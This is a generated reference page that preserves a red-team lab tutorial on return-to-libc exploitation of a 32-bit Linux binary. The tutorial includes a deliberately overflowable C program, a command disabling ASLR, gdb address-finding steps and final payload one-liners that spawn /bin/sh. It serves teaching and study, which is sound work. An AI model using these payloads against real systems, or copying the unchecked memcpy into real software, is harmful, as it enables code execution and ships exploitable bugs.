---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Return-to-libc

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-binary-exploitation-return-to-libc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/binary-exploitation/return-to-libc.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Return-to-libc](../../topics/offensive-security/return-to-libc.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-binary-exploitation-return-to-libc |
| name | Return-to-libc |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/binary-exploitation/return-to-libc.md |

## Preserved Source Material

````yaml
_asset_filenames:
- exploit-outside-gdb.gif
- image (834).png
- image (836).png
- image (837).png
- image (839).png
- image (842).png
- image (843).png
- image (844).png
- image (847).png
- image (849).png
- image (850).png
- image (851).png
- image (854).png
- image (857).png
- image (913).png
_body: "# Return-to-libc\n\nThe purpose of this lab is to familiarize with a ret-to-libc technique, which is used to exploit\
  \ buffer overflow vulnerabilities on systems where stack memory is protected with `no execute` \\(NX\\) bit.\n\n## Overview\n\
  \n{% hint style=\"info\" %}\n* The ret-to-libc technique is applicable to \\*nix systems.\n* This lab is only concerned\
  \ with 32-bit architecture.\n{% endhint %}\n\nIn a standard stack-based buffer overflow, an attacker writes their shellcode\
  \ into the vulnerable program's stack and executes it on the stack. \n\nHowever, if the vulnerable program's stack is protected\
  \ \\(NX bit is set, which is the case on newer systems\\), attackers can no longer execute their shellcode from the vulnerable\
  \ program's stack. \n\nTo fight the NX protection, a ret-to-libc technique is used that enables attackers to bypass the\
  \ NX bit protection and subvert the vulnerable program by re-using existing executable code from the standard C library\
  \ shared object \\(/lib/i386-linux-gnu/libc-\\*.so\\), that is loaded into vulnerable program's virtual memory space.\n\n\
  At a high level, ret-to-libc technique is similar to the regular stack overflow, with one key difference - instead of overwritting\
  \ the return address with address of the shellcode when exploiting a regular stack-based overflow with no stack protection,\
  \ in ret-to-libc case, the return address is overwritten with a memory address that points to the function `system(const\
  \ char *command)` that lives in the `libc`, so that when the overflowed program returns, it jumps to the `system()` function\
  \ and executes the shell command that was passed to the `system()` function as the `*command` argument. \n\nIn our case,\
  \ we will want the vulnerable program to spawn the `/bin/sh` shell, so we will make the vulnerable program call `system(\"\
  /bin/sh\")`.\n\n### Diagram\n\nBelow is a simplified diagram of the ret-to-libc exploitation process that we will go through\
  \ in this lab:\n\n![High level overview of ret-to-libc technique for a 32-bit vulnerable program](../../../.gitbook/assets/image%20%28834%29.png)\n\
  \nPoints to note in the overflowed buffer:\n\n1. EIP is overwritten with address of the `system()` function located inside\
  \ `libc`;\n2. Right after the address of `system()`, there's address of the function `exit()`, so that once `system()` returns,\
  \ the vulnerable program jumps the `exit()`, which also lives in the `libc`, so that the vulnerable program can exit gracefully;\n\
  3. Right after the address of `exit()`, there's a pointer to a memory location that contains the string `/bin/sh`, which\
  \ is the argument we want to pass to the `system()` function.\n\n### Stack Layout\n\nFrom the above diagram \\(after overflow\\\
  ), if you are wondering why, when looking from top to bottom, the stack's contents are:\n\n1. Address of the `/bin/sh` string\n\
  2. Address of the `exit()` function\n3. Address of the `system()` function\n\n...we need to remember what happens with the\
  \ stack when a function is called:\n\n1. Function arguments are pushed on to the stack in reverse order, meaning the left-most\
  \ argument will be pushed last;\n2. Return address, telling the program where to return after the function completes, is\
  \ pushed;\n3. EBP is pushed;\n4. Local variables are pushed.\n\nWith the above in mind, it should now be clear why the overflowed\
  \ stack looks that way - essentially, we manually built an arbitrary/half-backed stack frame for the `system()` function\
  \ call:\n\n* we pushed an address that contains the string `/bin/sh` - the argument for our `system()` call;\n* we also\
  \ pushed a return address, which the vulnerable program will jump to once the `system()` call completes, which in our case\
  \ is the address of the function `exit()`.\n\n## Vulnerable Program\n\nThe below is our vulnerable program for this lab,\
  \ which takes user input as a commandline argument and copies it to a memory location inside the program, without checking\
  \ if the user supplied buffer is bigger than the allocated memory:\n\n{% code title=\"vulnerable.c\" %}\n```cpp\n#include\
  \ <stdio.h>\n\nint main(int argc, char *argv[])\n{\n    char buf[8];\n    memcpy(buf, argv[1], strlen(argv[1]));\n    printf(buf);\n\
  }\n```\n{% endcode %}\n\nLet's compile the above code:\n\n```csharp\ncc vulnerable.c -mpreferred-stack-boundary=2 -o vulnerable\n\
  ```\n\n![Vulnerable program compiled](../../../.gitbook/assets/image%20%28836%29.png)\n\nAlso, let's temporarily switch\
  \ off the Address Space Layout Randomization \\(ASLR\\) to ensure it does not get in the way of this lab:\n\n```bash\necho\
  \ 0 > /proc/sys/kernel/randomize_va_space\n```\n\n![Temporarily disable ASLR](../../../.gitbook/assets/image%20%28857%29.png)\n\
  \nLet's now execute the vulnerable program via gdb, set a breakpoint on the function `main` and continue the execution:\n\
  \n```bash\ngdb vulnerable anything\nb main\nr\n```\n\n![Spawn vulnerable program with gdb, getting our hands dirty](../../../.gitbook/assets/image%20%28851%29.png)\n\
  \nAdditionally, we can confirm our binary has various protections enabled for it with the key one for this lab being the\
  \ NX protection:\n\n```text\nchecksec\n```\n\n![Protections overview for the vulnerable program](../../../.gitbook/assets/image%20%28837%29.png)\n\
  \n## Finding system\\(\\)\n\nIn gdb, by doing:\n\n```csharp\np system\n```\n\n...we can see, that the function `system`\
  \ resides at memory location `0xb7e13870` inside the vulnerable program in the `libc` library:\n\n![system\\(\\) is located\
  \ at 0xb7e13870](../../../.gitbook/assets/image%20%28839%29.png)\n\n## Finding exit\\(\\)\n\nThe same way, we can see that\
  \ `exit()` resides at `0xb7e06c30`:\n\n![exit\\(\\) is located at 0xb7e06c30](../../../.gitbook/assets/image%20%28847%29.png)\n\
  \n## Finding /bin/sh\n\n### Inside libc\n\nWe want to hijack the vulnerable program and force it to call `system(\"/bin/sh\"\
  )` and spawn the `/bin/sh` for us.\n\nWe need to remember that `system()` function is declared as `system(const char *command)`,\
  \ meaning if we want to invoke it, we need to pass it a memory address that contains the string that we want it to execute\
  \ \\(`/bin/sh`\\). We need to find a memory location inside the vulnerable program that contains the string `/bin/sh`. It's\
  \ known that the `libc` contains that string - let's see how we can find it.\n\nWe can inspect the memory layout of the\
  \ vulnerable program and find the start address of the `libc` \\(what memory address inside the vulnerable program it's\
  \ is loaded to\\):\n\n```csharp\ngdb-peda$ info proc map\n```\n\nBelow shows that `/lib/i386-linux-gnu/libc-2.27.so` inside\
  \ the vulnerable program starts at `0xb7dd6000`:\n\n![Inside the vulenerable program, libc is loaded at 0xb7dd6000](../../../.gitbook/assets/image%20%28854%29.png)\n\
  \nWe can now use the `strings` utility to find the offset of string `/bin/sh` relative to the start of the `libc` binary:\n\
  \n```csharp\nstrings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep \"/bin/sh\"\n```\n\nWe can see that the string is found\
  \ at offset `0x17c968`:\n\n![/bin/sh is at offset 0x17c968 from the start of libc](../../../.gitbook/assets/image%20%28843%29.png)\n\
  \n...which means, that in our vulnerable program, at address `0xb7f52968` \\(`0xb7dd6000` + `17c968`\\), we should see the\
  \ string `/bin/sh`, so let's test it:\n\n```csharp\nx/s 0xb7f52968\n```\n\nBelow shows that `/bin/sh` indeed lives at `0xb7f52968`:\n\
  \n![/bin/sh inside vulnerable program is located at 0xb7f52968](../../../.gitbook/assets/image%20%28844%29.png)\n\n### Inside\
  \ SHELL Environment Variable\n\nAdditionally, we can find the location of the environment variable `SHELL=/bin/sh` on the\
  \ vulnerable program's stack:\n\n```c\nx/s 500 $esp\n```\n\n![](../../../.gitbook/assets/image%20%28849%29.png)\n\nIn the\
  \ above screenshot, we can see that at `0xbffffeea` we have the string `SHELL=/bin/sh`. Since we only need the address of\
  \ the string `/bin/sh` \\(without the `SHELL=` bit in front, which is 6 characters long\\), we know that `0xbffffeea + 6`\
  \ will give us the exact location we are looking for, which is `0xBFFFFEF0`:\n\n![/bin/sh as an environment variable inside\
  \ the vulnerable program at 0xBFFFFEF0](../../../.gitbook/assets/image%20%28850%29.png)\n\n### Find String in gdb-peda\n\
  \nWorth remembering, that we can look for the required string using gdb-peda like so:\n\n```text\nfind \"/bin/sh\"\n```\n\
  \n![/bin/sh can be seen in multiple locations in the vulnerable program](../../../.gitbook/assets/image%20%28913%29.png)\n\
  \n## Exploiting\n\nAssuming we need to send 16 bytes of garbage to the vulnerable program before we can overwrite its return\
  \ address, and make it jump to `system()` \\(located at `0xb7e13870`, expressed as `\\x70\\x38\\xe1\\xb7` due to little-endianness\\\
  ), which will execute `/bin/sh` that's present in  `0xb7f52968` \\(expressed as `\\x68\\x29\\xf5\\xb7`\\), the payload in\
  \ a general form looks like this:\n\n```csharp\npayload = A*16 + address of system() + return address for system() + address\
  \ of \"/bin/sh\"\n```\n\n...and when variables are filled in with correct memory addresses, the final exploit looks like\
  \ this:\n\n```c\nr `python -c 'print(\"A\"*16 + \"\\x70\\x38\\xe1\\xb7\" + \"\\x30\\x6c\\xe0\\xb7\" + \"\\x68\\x29\\xf5\\\
  xb7\")'`\n```\n\nOnce executed, we can observe how `/bin/sh` gets executed:\n\n![Vulnerable program spawns a /bin/sh shell](../../../.gitbook/assets/image%20%28842%29.png)\n\
  \nLet's see if the exploit works outside gdb:\n\n{% hint style=\"warning\" %}\nAddresses of `system()`, `exit()` and `/bin/sh`\
  \ used in the below payload are different to those captured in earlier screenshots due to a rebooted VM.\n{% endhint %}\n\
  \n```python\n./vulnerable `python -c 'print(\"A\"*16 + \"\\x40\\xe0\\xe0\\xb7\" + \"\\x90\\xb3\\xf0\\xb7\" + \"\\x3c\\x53\\\
  xf5\\xb7\")'`\n```\n\n![Once the vulnerable program is exploited, it spawns a /bin/sh](../../../.gitbook/assets/exploit-outside-gdb.gif)\n\
  \n## References\n\n[https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)\n\
  \n[https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf)"
_relative_path: offensive-security/code-execution/binary-exploitation/return-to-libc.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/binary-exploitation/return-to-libc.md
````
